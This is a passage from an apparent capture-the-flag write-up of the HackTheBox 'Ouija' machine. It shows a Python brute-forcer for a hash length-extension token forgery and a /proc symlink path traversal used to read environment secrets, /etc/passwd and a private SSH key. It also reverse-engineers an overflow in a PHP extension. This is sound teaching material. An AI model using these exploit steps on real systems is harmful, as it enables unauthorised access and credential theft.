oxdf@hacky$ curl 'http://10.10.11.244:3000/users' -H "ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b" -H "identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA4MDNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ=="
"Invalid Token"

```

That hash didn’t work because the length was wrong.

#### Find Length

The obvious way to find the right secret length is just to brute force it. I could do this in Bash, but to practice some of the better Python techniques I’ve been developing lately I’ll develop in Python, shown in [this video](https://www.youtube.com/watch?v=bthSfRlJOfM):

The final script is:

```

#!/usr/bin/env python3

import requests
import subprocess
from base64 import b64encode

data = "bot1:bot"
append = "::admin:True"
signature = "4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"

class HashExtender:
    """/opt/hash_extender/hash_extender --data 'bot1:bot' --append "::admin:True" --signature 4b22a0418847a51650623a458acc1bba5c01f6521ea6
135872b9f15b56b988c1 --format sha256 --secret 8"""

    @classmethod
    def generate(cls, secret_length: int, orig_data: str, append_data: str, signature: str) -> 'HashExtender':
        he = cls(secret_length, orig_data, append_data, signature)
        he.calculate()
        return he

    def __init__(self, secret_length: int, orig_data: str, append_data: str, signature: str) -> None:
        self.secret_length: int = secret_length
        self.signature: str = signature
        self.orig_data: str = orig_data
        self.append_data: str = append_data

    def calculate(self) -> None:
        result = subprocess.run(
            [
                "/opt/hash_extender/hash_extender",
                "--data",
                self.orig_data,
                "--append",
                self.append_data,
                "--signature",
                self.signature,
                "--format",
                "sha256",
                "--secret",
                str(self.secret_length),
            ],
            capture_output=True,
        )
        lines = result.stdout.decode().split('\n')
        assert lines[2].startswith("New signature")
        self.new_signature = lines[2].split(" ")[-1]
        assert lines[3].startswith("New string")
        self.new_data = lines[3].split(" ")[-1]

    @property
    def encoded_new_data(self) -> str:
        return b64encode(self.new_data.encode()).decode()

    def __str__(self) -> str:
        return f"secret length: {self.secret_length}\nihash: {self.new_signature}\nidentification: {self.encoded_new_data}"

    def __repr__(self) -> str:
        return f"<HashExtender seclen: {self.secret_length} data: {self.new_data} sig: {self.new_signature}>"

def check_signature(data, ihash) -> bool:
    """curl http://ouija.htb:3000/users -H "ihash: 4b22a04
18847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1" -H "identification: NjI2Zjc0MzEzYTYyNmY3NAo=";"""
    resp = requests.get(
        'http://ouija.htb:3000/users',
        headers={'ihash': ihash, 'identification': data}
    )
    return not "Invalid Token" in resp.text

for i in range(100):
    he = HashExtender.generate(i, data, append, signature)
    if check_signature(he.encoded_new_data, he.new_signature):
        break

print(he)

```

Running it gives me a valid token:

```

oxdf@hacky$ time python find_hash.py 
secret length: 23
ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==

real    0m4.618s
user    0m0.155s
sys     0m0.005s
oxdf@hacky$ curl http://ouija.htb:3000/users -H "ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b" -H "identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ=="; echo
{"message":"Database unavailable"}

```

It says unavailable, but that means the token is good.

### File Read

#### /proc

I can’t give the `/file/get` endpoint anything starting with `/` or that contains `..`, but I do have that symbolic link to `/proc` at `.config/bin/process_informations`. I’ll try to read from that:

```

oxdf@hacky$ curl http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/cmdline -H "identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==" -H "ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b"
{"message":"/usr/bin/js\u0000/var/www/api/app.js\u0000"}

```

That’s the command line showing `/usr/bin/js /var/www/api/app.js`! I can pull the environment (with some `jq` and `tr` to make it pretty):

```

oxdf@hacky$ curl http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/environ -H "identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==" -H "ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b" -s | jq -r '.message' | tr '\000' '\n'
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME=/home/leila
LOGNAME=leila
USER=leila
SHELL=/bin/bash
INVOCATION_ID=fe2b8312bab3450fa67aa83479a149e8
JOURNAL_STREAM=8:22049
SYSTEMD_EXEC_PID=848
k=FKJS645GL41534DSKJ@@GBD

```

I’ll note that the process is running as leila, who has home directory `/home/leila`.

The secret is there, `k`. It’s 23 characters as expected, and when combined with “bot:bot1” it makes the expected hash:

```

oxdf@hacky$ echo -n "FKJS645GL41534DSKJ@@GBD" | wc -c
23
oxdf@hacky$ echo -n "FKJS645GL41534DSKJ@@GBDbot1:bot" | sha256sum 
4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1  -

```

#### Escape

One of the files in `/proc` for a given process is `root`, which is a symbolic link to the root of the filesystem. This is used for processes running in jails or containers:

```

oxdf@hacky$ ls -l root
lrwxrwxrwx 1 oxdf oxdf 0 May 15 12:39 root -> /

```

Using this, I can read basically any file that leila can read:

```

oxdf@hacky$ curl http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/root/etc/passwd -H "identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==" -H "ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b" -s | jq -r '.message'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
leila:x:1000:1000:helper:/home/leila:/bin/bash
fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

```

That includes leila’s private SSH key:

```

oxdf@hacky$ curl http://ouija.htb:3000/file/get?file=.config/bin/process_informations/self/root/home/leila/.ssh/id_rsa -H "identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDBmODNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==" -H "ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b" -s | jq -r '.message'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqdhNH4Q8tqf8bXamRpLkKKsPSgaVR1CzNR/P2WtdVz0Fsm5bAusP
...[snip]...
DvfM2TbsfLo4kAAAALbGVpbGFAb3VpamE=
-----END OPENSSH PRIVATE KEY-----

```

### SSH

With that key, I can connect to Ouija with SSH as leila:

```

oxdf@hacky$ ssh -i ~/keys/ouija-leila leila@ouija.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
...[snip]...
leila@ouija:~$ 

```

And read `user.txt`:

```

leila@ouija:~$ cat user.txt
9c465d39************************

```

## Shell as root

### Enumeration

#### Home Directories

leila’s home directory is very empty:

```

leila@ouija:~$ ls -la
total 36
drwxr-x--- 5 leila leila 4096 Nov 22 12:58 .
drwxr-xr-x 3 root  root  4096 Nov 22 12:13 ..
lrwxrwxrwx 1 root  root     9 Jun 26  2023 .bash_history -> /dev/null
-rw-r--r-- 1 leila leila  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 leila leila 3771 Jan  6  2022 .bashrc
drwx------ 2 leila leila 4096 Nov 22 12:13 .cache
drwxrwxr-x 3 leila leila 4096 Nov 22 12:13 .local
-rw-r--r-- 1 leila leila  807 Jan  6  2022 .profile
drwx------ 2 leila leila 4096 Nov 22 12:13 .ssh
-rw-r----- 1 root  leila   33 Jun 26  2023 user.txt

```

There’s no other home directory and no other non-root user with a shell:

```

leila@ouija:/home$ ls
leila
leila@ouija:/home$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
leila:x:1000:1000:helper:/home/leila:/bin/bash

```

#### Processes

leila can only see processes they started:

```

leila@ouija:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
leila        848  0.0  2.1 668208 87272 ?        Ssl  May13   0:14 /usr/bin/js /var/www/api/app.js
leila       1692  0.2  4.2 1401124 172216 ?      Ssl  May13  11:09 /usr/local/bin/gitea web
leila    1223029  3.5  0.2  17316 10020 ?        Ss   21:55   0:00 /lib/systemd/systemd --user
leila    1223143  0.6  0.1   8672  5468 pts/0    Ss   21:55   0:00 -bash
leila    1223163  0.0  0.0  10068  1600 pts/0    R+   21:55   0:00 ps auxww

```

That’s because `/proc` is mounted as `hidepid=invisible`.

#### Network Listeners

There are a bunch of listening ports:

```

leila@ouija:~$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45241         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:3002         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6007         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6006         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6005         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6004         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6003         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6002         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6001         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6000         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6015         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6014         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6013         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6012         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6011         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6010         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6009         0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:6008         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      848/js

```

All of the 172.17.0.1 listeners are different instances of HA Proxy. When there’s a smuggling attack, HTB likes to load balance users between containers to keep users from stepping on each other in shared labs.

22 is SSH and 3000 is the API. 3002 is Gitea.

It’s not clear what 45241 is. 9999 is interesting.

### Internal Website

#### Service

I’ll find the service with `grep` in the `/etc/systemd` folder:

```

leila@ouija:/etc/systemd$ grep -r 9999
system/start__pph.service:ExecStart=/usr/bin/php -S 127.0.0.1:9999

```

The full service is:

```

[Unit]
Description=VERTICA

[Service]
User=root
WorkingDirectory=/development/server-management_system_id_0
ExecStart=/usr/bin/php -S 127.0.0.1:9999
Restart=always

[Install]
WantedBy=multi-user.target

```

It’s running as root, which makes it an interesting target for sure.

#### /development

The `/development` folder also stands out as an interesting non-standard directory in the filesystem root:

```

leila@ouija:/development$ ls
gov-management_system_id_386  gym-management_system_id_385  school-management_system_id_384  server-management_system_id_0  utils

```

Most of the folders aren’t interesting. `utils` has a `debug.php` file that’s used by the running service:

```

<?php
        function init_debug(){
                system("rm .debug 2>/dev/null");
                mkdir(".debug");
                copy("/proc/self/maps", ".debug/maps");
                $F = fopen(".debug/i", "w") or die('error in opening file');
                fwrite($F, "1");
                fclose($F);
        }
        function dprint($m,$va){
                if(info__index__wellcom::$__DEBUG){
                        //
                }
        }
?>

```

This is a super weird file, creating copies of `/proc` files and writing “1” to another. They are both present:

```

leila@ouija:/development/server-management_system_id_0$ ls .debug/
i  maps

```

#### Website

I’ll use SSH to forward 9999 on my box to 9999 on localhost and load the page in Firefox:

![image-20240515212153885](/img/image-20240515212153885.png)

It’s just a simple login form. Submitting bad creds just loads an empty page, thought it’s trying to show an alert about bad creds.

#### PHP Source

The `server-management_system_id_0` folder has the source for this page:

```

leila@ouija:/development/server-management_system_id_0$ ls
core  img  index.php  main.js  README.md  style.css

```

The login portion of the PHP code looks like:

```

<?php
        if(isset($_POST['username']) && isset($_POST['password'])){
//              system("echo ".$_POST['username']." > /tmp/LOG");
                if(say_lverifier($_POST['username'], $_POST['password'])){
                        session_start();
                        $_SESSION['username'] = $_POST['username'];
                        $_SESSION['IS_USER_'] = "yes";
                        $_SESSION['__HASH__'] = md5($_POST['username'] . "::" . $_POST['password']);
                        header('Location: /core/index.php');
                }else{
                        echo "<script>alert('invalid credentials')</alert>";
                }
        }
?>

```

#### Identify Shared Object

It’s passing the input username and password to a function called `say_lverifier`. Interestingly, that function isn’t defined in any PHP code here, but it is a shared object loaded into the processed memory:

```

leila@ouija:/development/server-management_system_id_0$ grep -r lverifier .
./.debug/maps:7f803eac7000-7f803eac8000 r--p 00000000 fd:00 30980                      /usr/lib/php/20220829/lverifier.so
./.debug/maps:7f803eac8000-7f803eac9000 r-xp 00001000 fd:00 30980                      /usr/lib/php/20220829/lverifier.so
./.debug/maps:7f803eac9000-7f803eaca000 r--p 00002000 fd:00 30980                      /usr/lib/php/20220829/lverifier.so
./.debug/maps:7f803eaca000-7f803eacb000 r--p 00002000 fd:00 30980                      /usr/lib/php/20220829/lverifier.so
./.debug/maps:7f803eacb000-7f803eacc000 rw-p 00003000 fd:00 30980                      /usr/lib/php/20220829/lverifier.so
./index.php:            if(say_lverifier($_POST['username'], $_POST['password'])){

```

This file is loaded in `/etc/php/8.2/apache2/php.ini` and `/etc/php/8.2/cli/php.ini` (I think the second one is what matters when PHP is launched the way it is here, and the first actually contains a typo, misspelling “extention”):

```

leila@ouija:/etc/php/8.2$ grep -r lverifier .
./apache2/php.ini:extention=lverifier.so
./cli/php.ini:extension=lverifier.so

```

That file is located at `/usr/lib/php/20220829/lverifier.so`:

```

leila@ouija:/$ find . -name lverifier.so 2>/dev/null
./usr/lib/php/20220829/lverifier.so

```

I’ll copy this back to evaluate:

```

oxdf@hacky$ scp -i ~/keys/ouija-leila leila@ouija.htb:/usr/lib/php/20220829/lverifier.so .
lverifier.so                                           100%   42KB 137.0KB/s   00:00

```

### Set Up Debugging

#### PHP Console

To interact with this plugin, I’ll want to load it into a local PHP shell using the `dl` [function](https://www.php.net/manual/en/function.dl.php). But `dl` won’t work by default:

```

php > dl('lverifier');
PHP Warning:  dl(): Dynamically loaded extensions aren't enabled in php shell code on line 1

```

In `/etc/php/8.1/cli/php.ini`, I’ll change this line from `Off` to `On`:

```

enable_dl = On

```

Now it does, and it takes a module name:

```

php > dl('./lverifier');
PHP Warning:  dl(): Temporary module name should contain only filename in php shell code on line 1
php > dl('./lverifier.so');
PHP Warning:  dl(): Temporary module name should contain only filename in php shell code on line 1
php > dl('lverifier');
PHP Warning:  dl(): Unable to load dynamic library 'lverifier' (tried: /usr/lib/php/20210902/lverifier (/usr/lib/php/20210902/lverifier: can
not open shared object file: No such file or directory), /usr/lib/php/20210902/lverifier.so (/usr/lib/php/20210902/lverifier.so: cannot open
 shared object file: No such file or directory)) in php shell code on line 1  

```

From the errors, it’s trying `lverifier` and `lverifier.so` in `/usr/lib/php/20210902`. I’ll copy it there and make it executable:

```

oxdf@hacky$ sudo cp lverifier.so /usr/lib/php/20210902/
oxdf@hacky$ sudo chmod 777 /usr/lib/php/20210902/lverifier.so

```

Next it returns a different error:

```

php > dl('lverifier');
PHP Warning:  dl(): lverifier: Unable to initialize module
Module compiled with module API=20220829
PHP    compiled with module API=20210902
These options need to match
 in php shell code on line 1

```

[This gist](https://gist.github.com/tillkruss/624880545dcbd4b145160e9f9bd1cb02) shows that I’m running PHP 8.1, but it wants PHP 8.2. I’ll follow the instructions [here](https://php.watch/articles/install-php82-ubuntu-debian) to upgrade. If I run 8.2 and try again, I’ll be right back at the start, needing to enable `dl` in `/etc/php/8.2/cli.php.in`, copy the `.so` file into `/usr/lib/php/20220809` and make it executable:

```

oxdf@hacky$ sudo vim /etc/php/8.2/cli/php.ini 
oxdf@hacky$ sudo cp lverifier.so /usr/lib/php/20220829/
oxdf@hacky$ sudo chmod 777 /usr/lib/php/20220829/lverifier.so 

```

Now it loads!

```

php > dl('lverifier');
php >

```

And I can run `say_lverifier`:

```

php > say_lverifier("0xdf", "password");
error in reading shadow file

```

It’s interesting that it’s asking for the `shadow` file. If I run as root:

```

php > echo say_lverifier("0xdf", "password");   // non-existing user
php > echo say_lverifier("oxdf", "password");   // user exists, bad password
php > echo say_lverifier("oxdf", "**************");   // correct
1

```

It seems to be validating passwords based on `/etc/shadow`.

#### GDB

To debug this code, I’ll use `gdb` with [Peda](https://github.com/longld/peda). To start, I’ll run:

```

oxdf@hacky$ sudo gdb -q --args php -a
Reading symbols from php...
(No debugging symbols found in php)
gdb-peda$

```

Now I want to load the module. I’ll use `r` to run, and then interact with PHP:

```

gdb-peda$ r
Starting program: /usr/bin/php -a
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Interactive shell

php > dl('lverifier');
php >

```

At this point I’ll Ctrl-c to break back to `gdb`, and entry the breakpoint (I’ll show where that function name comes from shortly):

```

gdb-peda$ b validating_userinput
Breakpoint 1 at 0x7ffff351c850: file /home/kali/Desktop/programming/CHALLS/hackthebox-MACHINE-DEV/ouija/vulnerable_PHP_extention/php-src/ext/lverifier/login.c, line 162.

```

`c` will continue running from `gdb`, and then I’ll enter `say_lverifier("0xdf","password");` and it hits the break point.

It’s also worth noting that the author left some of the source symbols in the binary, which is why it shows the full path to the `login.c` file from the author’s computer when I put in the breakpoint. If I run `info functions`, there’s a ton of output, including the functions listed per source file:

```

File /home/kali/Desktop/programming/CHALLS/hackthebox-MACHINE-DEV/ouija/vulnerable_PHP_extention/php-src/ext/lverifier/login.c:             
8:      void __abort(char *);
12:     void d(char *);
24:     int event_recorder(char *, char *);
14:     int get_clean_size(char *);
90:     int get_the_salt(char *, char *, char *);
56:     int get_user_and_pwd(char *, int, char *, char *);
80:     int load_users(char *, char *);
20:     void update(char *, char *);
160:    int validating_userinput(char *, char *);
114:    int verify_login(char *, char *, const char *, int, char *);

```

### lverifier.so

#### Entry

I’ll open this binary in Ghidra.

There’s a ton of good information on how to create a PHP module in [this post on PHP Internals Book](https://www.phpinternalsbook.com/php7/extensions_design/php_functions.html). To create a function that can be called in PHP from a function in C, the `PHP_FUNCTION` macro is called with the C function which expands to a C symbol beginning with `zif_`. When looking at the functions, `zip_say_lverifier` is one:

![image-20240516125006480](/img/image-20240516125006480.png)

I’ll start there. The structure of this function should look like the example here:

```

static double php_fahrenheit_to_celsius(double f)
{
    return ((double)5/9) * (double)(f - 32);
}

PHP_FUNCTION(fahrenheit_to_celsius)
{
    double f;

    if (zend_parse_parameters(ZEND_NUM_ARGS(), "d", &f) == FAILURE) {
        return;
    }

    RETURN_DOUBLE(php_fahrenheit_to_celsius(f));
}

```

The macro expands to:

```

void zif_fahrenheit_to_celsius(zend_execute_data *execute_data, zval *return_value)
{
    /* code to go here */
}

```

Looking at `zif_lverifier`, it has the same structure:

```

void zif_say_lverifier(zend_execute_data *execute_data, zval *return_value)

{
  int iVar1;
  undefined8 username;
  undefined len_username [8];
  undefined8 password;
  undefined len_password [8];
  
  zend_parse_parameters
            (*(undefined4 *)(execute_data + 0x2c),&ss,&username,len_username,&password,len_password)
  ;
  iVar1 = validating_userinput(username,password);
  *(uint *)(return_value + 8) = (iVar1 == 1) + 2;
  return;
}

```

It uses `zend_parse_parameters` to get `username` and `password` (and their lengths), and those strings are passed into `validating_userinput`.

#### validating\_userinput - username Length calculations

This function is the important one to understand. At the start, it defines a couple of strings on the stack:

![image-20240516130923397](/img/image-20240516130923397.png)

(1) and (2) are the strings `/var/log/lverifier.log` and `session=l:user=root:version=beta:type=testing`. Also in here it’s messing with the username length, first calculating it at (3), and then getting a modified version of it at (4).

Looking more closely at four, it is worth looking more closely at the assembly (`disassemble validating_userinput` in `gdb`):

![image-20240516131517352](/img/image-20240516131517352.png)
1. Gets the length of the input username.
2. Adds 10 (0xa).
3. Moves `ax` to `rax`. This effectively takes this length mod 65535 (this will be important later).
4. Adds 15.
5. AND `0xfffffffffffffff0`, when combined with 4 it effectively rounds up to the nearest multiple of 16.
6. Creates space on the stack of the size just calculated.
7. Zeros EAX.

The value saved here (I’ve named `short_username_len`) is then again used at the end of the function:

![image-20240516132002070](/img/image-20240516132002070.png)

Effectively, this is the result of creating a variable in C with a length defined by something else. If the stack looks like this:

```

  _______________
 |   new_buffer  |
 |_______________|
 |   log_path    |
 |_______________|
 |   log_data    |
 |_______________|
 |      ...      |
 |_______________|
 | username_copy |
 |_______________|

```

The size of `new_buffer` is created dynamically, calculated from the length of the input `username`.

#### validating\_userinput - Copying #1

The next block is also confusing, but playing with it in `gdb` shows it’s not too complex:

![image-20240516135558462](/img/image-20240516135558462.png)

If the username is greater than 800 long (based on the `strlen` response, not the calculation), then it effectively does a `memcpy` to get 800 bytes at (1), storing it into a buffer on the stack I’m calling `username_copy`. In assembly it looks like:

```

   0x00007ffff351c930 <+224>:   mov    ecx,0x64
   0x00007ffff351c935 <+229>:   mov    rdi,rax
   0x00007ffff351c938 <+232>:   mov    rsi,r12
   0x00007ffff351c93b <+235>:   rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]

```

Otherwise, at (2) it does a complicated copy until it reaches a null byte, again into `username_copy`. The string copy path is actually coded poorly and breaks the log data and log file variables that were set above on the stack.

#### validating\_userinput - Copying #2

Then there’s another block copy:

![image-20240516140201174](/img/image-20240516140201174.png)

Here it’s using the `short_username_len` calculated above to get the location of the dynamically sized buffer relative to `log_path` (because the start of the dynamic buffer is that many bytes less than the starting address of `log_path`, and `short_username_len` is negative). This ends in a `for` loop which is much simpler in the assembly:

```

   0x00007ffff351c982 <+306>:   rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]

```

This time it copies 800 bytes (fixed size) from the `username_copy` buffer to the dynamically sized buffer. This is where it breaks if the username was less than 800. If the username was 15 long, then it copied 15 into that buffer, leaving 785 bytes of junk. Now we copy 800 bytes into a 15 byte buffer, overflowing the junk into other variables `log_data` and `log_path` (preview of what’s to come).

#### validating\_userinput - Calls

Now that it’s prepped all this data by weirdly copying it around, it uses it to make three function calls:

![image-20240516141822411](/img/image-20240516141822411.png)

It prints the `log_data` and `log_path`, it passes the same data to `event_recorder`, and then it calls `load_users` on the dynamic buffer and the password.

I believe lines 154, 156, and 158 are just misinterpretations by Ghidra when decompiling.

#### event\_recorder

This function has a bunch of Ghidra cruft, but it seems to be very simple:
- If both `log_path` and `log_data` are strings of length one or greater, open the log and write the data.
- In the case where only one is defined, there’s a default filename of `/var/log/lverifier.log`, or default data of “session=1:user=root:version=beta:type=testing”.

It also uses a weird length calculation for how much to write, `get_clean_size`, which reads bytes up until a newline (`\n`) or a `EOF` (0xff):

```

long get_clean_size(char *param_1)

{
  long len;
  long i;
  char *ptr;
  
  if ((*param_1 != '\n') && (i = 1, *param_1 != -1)) {
    do {
      ptr = param_1 + i;
      len = i;
      i = i + 1;
      if (*ptr == '\n') {
        return len;
      }
    } while (*ptr != -1);
    return len;
  }
  return 0;
}

```

### Arbitrary Write

#### Strategy

I’ve noted that the username will be copied into an 800 byte buffer, and then that entire buffer will be copied into another buffer that’s the size of the username input, overflowing the log file path and data if the username is less than 800 bytes. That on its own is not enough to edit these, as any data I enter is counted in the length and thus ends up in the dynamic buffer, and only junk after overwrites.

There’s an integer overflow in the calculation of the length for the size of the dynamic buffer, as the variable used to calculate the size is a 16bit short. So if I submit a name longer than 65535 bytes, the calculated size of the dynamic buffer will be small, but it will still copy 800 bytes in, all of which I control.

I can abuse this to get arbitrary write by carefully writing a newline terminated filename and data to where those are stored.

#### Integer Overflow POC

I’ll start by showing the non-overflow case. I’ll put a breakpoint at `validating_userinput+111`, and run with a reasonable username and password:

```

php > say_lverifier("username", "password123");

```

When it hits that breakpoint, RAX holds the value calculated as 10 plus the length rounded up to a multiple of 16. So I’d expect 8 + 10 –> 32 (0x20), which matches:

```

[----------------------------------registers-----------------------------------]
RAX: 0x20 (' ')
RBX: 0x7ffff5269400 ("password123")
RCX: 0x51 ('Q')
RDX: 0x8 
RSI: 0x676f6c2e7265 ('er.log')
RDI: 0x7fffffffc5f0 --> 0xd68 ('h\r')
RBP: 0x7fffffffcbc0 --> 0x2 
RSP: 0x7fffffffc550 ("/var/log/lverifi\202\t")
RIP: 0x7ffff351c8bf (<validating_userinput+111>:        sub    rsp,rax)
R8 : 0x7fffffffcbe8 --> 0xb ('\x0b')
R9 : 0x0 
R10: 0x2 
R11: 0x1 
R12: 0x7ffff52693d8 ("username")
R13: 0x7fffffffcd10 --> 0x3e003e0000000000 ('')
R14: 0x7ffff5212020 --> 0x7ffff5281060 --> 0x5555558bcf33 (<execute_ex+14339>:  endbr64)
R15: 0x7ffff5281060 --> 0x5555558bcf33 (<execute_ex+14339>:     endbr64)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff351c8ad <validating_userinput+93>:    movaps XMMWORD PTR [rbp-0x650],xmm0
   0x7ffff351c8b4 <validating_userinput+100>:   and    rax,0xfffffffffffffff0
   0x7ffff351c8b8 <validating_userinput+104>:   movaps XMMWORD PTR [rbp-0x640],xmm0
=> 0x7ffff351c8bf <validating_userinput+111>:   sub    rsp,rax
   0x7ffff351c8c2 <validating_userinput+114>:   xor    eax,eax
   0x7ffff351c8c4 <validating_userinput+116>:   movaps XMMWORD PTR [rbp-0x630],xmm0
   0x7ffff351c8cb <validating_userinput+123>:   rep stos QWORD PTR es:[rdi],rax
